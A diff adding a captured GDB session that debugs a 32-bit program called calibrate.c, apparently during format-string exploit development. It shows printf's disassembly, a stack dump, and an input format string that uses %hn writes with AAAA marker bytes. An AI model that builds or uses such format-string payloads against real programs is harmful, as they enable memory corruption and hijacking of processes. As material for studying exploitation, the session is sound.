@@ -1,0 +1,44 @@
+┌─calibrate.c───────────────────────────────────────────────────────────────────┐
+│                                                                               │
+│                                                                               │
+│                                                                               │
+│                                                                               │
+│                                                                               │
+│                                                                               │
+│               [ No Source Available ]                                         │
+│                                                                               │
+│                                                                               │
+│                                                                               │
+│                                                                               │
+│                                                                               │
+┌───────────────────────────────────────────────────────────────────────────────┐
+│  > 0x8049abe <printf>      push   %ebx                                        │
+│    0x8049abf <printf+1>    call   0x804909c <__x86.get_pc_thunk.bx>           │
+│    0x8049ac4 <printf+6>    add    $0x6524,%ebx                                │
+│    0x8049aca <printf+12>   sub    $0x8,%esp                                   │
+│    0x8049acd <printf+15>   lea    0x14(%esp),%eax                             │
+│    0x8049ad1 <printf+19>   push   %edx                                        │
+│    0x8049ad2 <printf+20>   push   %eax                                        │
+│    0x8049ad3 <printf+21>   push   0x18(%esp)                                  │
+│    0x8049ad7 <printf+25>   lea    0xd8(%ebx),%eax                             │
+│    0x8049add <printf+31>   push   %eax                                        │
+│    0x8049ade <printf+32>   call   0x804b2e5 <vfprintf>                        │
+│    0x8049ae3 <printf+37>   add    $0x18,%esp                                  │
+│    0x8049ae6 <printf+40>   pop    %ebx                                        │
+└───────────────────────────────────────────────────────────────────────────────┘
+native process 6865 In: printf                               L8    PC: 0x8049abe
+(gdb) s
+printf (fmt=0xffffdba0 "AAAA____AAAA____%0u%hn%0u%hn\n") at src/stdio/printf.c:8
+(gdb) refresh
+(gdb) targ
+0xffffdb50:     0x0804ffe8      0xffffdcb4      0x00000002      0x0804922f
+0xffffdb60:     0xffffdba0      0x00000080      0x08050020      0x080493c5
+0xffffdb70:     0x00000000      0x00000000      0x00000001      0x00000000
+0xffffdb80:     0x00000002      0x00000000      0xffffdc28      0x0804928f
+0xffffdb90:     0xffffdba0      0x08048034      0x00000020      0x00000008
+0xffffdba0:     0x41414141      0x5f5f5f5f      0x41414141      0x5f5f5f5f
+0xffffdbb0:     0x25753025      0x30256e68      0x6e682575      0x0000000a
+0xffffdbc0:     0x000003ee      0xffffddab      0x078bfbfd      0x00000064
+0xffffdbd0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdbe0:     0x00000000      0x00000001      0x00000000      0xffffdd9b
+(gdb)
